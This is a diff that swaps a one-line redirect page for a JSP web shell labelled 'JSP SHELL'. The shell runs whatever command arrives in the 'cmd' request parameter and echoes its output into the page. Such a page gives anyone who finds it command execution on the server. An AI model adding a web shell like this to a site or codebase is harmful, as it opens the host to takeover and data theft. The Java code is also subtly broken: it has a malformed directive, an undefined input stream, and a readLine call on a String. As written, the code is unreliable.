@@ -1,3 +1,27 @@
-<html><head>
-  <script language='javascript'>window.top.location.replace("https://en.wikipedia.org/wiki/Phishing")</script>
-</head><body></body></html>
+<% page import="java.util.*,java.io.*"%>
+<%
+%>
+<HTML>
+<BODY>
+  <H3>JSP SHELL</H3>
+  <FORM METHOD="GET" NAME="myform" Action="">
+    <INPUT TYPE="text" NAME="cmd">
+    <INPUT TYPE="submit" VALUE="Execute">
+  </FORM>
+  <PRE>
+  <%
+  if (request.getParameter("cmd") != null) {
+     out.println("Command: " + request.getParameter("cmd") + "<BR>");
+     Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+     OutputStream os = p.getOutputStream();
+     DataInputStream dis = new DataInputStream(in);
+     String disr = dis.readLine();
+     while ( disr != null ) {
+     out.println(disr);
+     disr = disr.readLine();
+     }
+  }
+  %>
+    </PRE>
+    </BODY>
+  </HTML>
